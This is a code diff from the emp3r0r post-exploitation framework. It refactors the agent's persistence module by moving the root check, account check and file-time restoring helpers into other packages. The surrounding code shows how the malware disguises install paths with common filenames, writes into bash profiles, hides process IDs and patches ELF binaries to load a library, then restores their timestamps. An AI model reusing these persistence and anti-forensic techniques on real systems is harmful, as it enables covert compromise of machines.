@@ -13,9 +13,11 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -49,7 +51,7 @@ var (
 
 // Configure install locations
 func getInstallLocations() (locations []string) {
-	for _, loc := range WritableLocations {
+	for _, loc := range common.WritableLocations {
 		fname := def.CommonFilenames[util.RandInt(0, len(def.CommonFilenames))]
 		locations = append(locations, loc+"/"+fname)
 	}
@@ -111,7 +113,7 @@ func profiles() (err error) {
 	if err != nil {
 		return fmt.Errorf("cannot get user profile: %v", err)
 	}
-	accountInfo, err := CheckAccount(user.Name)
+	accountInfo, err := sysinfo.CheckAccount(user.Name)
 	if err != nil {
 		return fmt.Errorf("cannot check account info: %v", err)
 	}
@@ -119,7 +121,7 @@ func profiles() (err error) {
 	// source
 	bashprofile := fmt.Sprintf("%s/.bash_profile", user.HomeDir)
 	sourceCmd := "source ~/.bash_profile"
-	if HasRoot() {
+	if sysinfo.HasRoot() {
 		bashprofile = "/etc/bash_profile"
 		sourceCmd = "source /etc/bash_profile"
 	}
@@ -232,7 +234,7 @@ func HidePIDs() (err error) {
 
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
-	if !HasRoot() {
+	if !sysinfo.HasRoot() {
 		return errors.New("root required")
 	}
 
@@ -271,7 +273,7 @@ func patcher() (err error) {
 
 		// Restore the original file timestamps
 		// ctime is not changed
-		err = RestoreFileTimes(file)
+		err = agentutils.RestoreFileTimes(file)
 		if err != nil {
 			return err
 		}
